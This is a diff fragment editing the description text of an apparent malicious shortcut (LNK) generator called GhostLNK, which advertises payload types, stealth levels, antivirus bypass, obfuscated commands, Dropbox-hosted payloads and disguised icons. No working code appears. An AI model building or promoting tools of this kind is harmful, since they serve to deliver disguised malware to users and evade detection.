+            "<b>GhostLNK v6.0 - Stealth Mode Edition</b><br><br>"
+            "Ultimate LNK Generator with:<br>"
             "✓ Multiple payload types<br>"
+            "✓ 3 stealth levels (Normal, Moderate, Maximum)<br>"
+            "✓ AV bypass techniques<br>"
             "✓ Dropbox URL validation<br>"
             "✓ Realistic icon disguises<br><br>"
+            "<b>Maximum Stealth:</b> Obfuscated commands, no suspicious flags<br><br>"
             "⚠️ For authorized testing only")
 
 
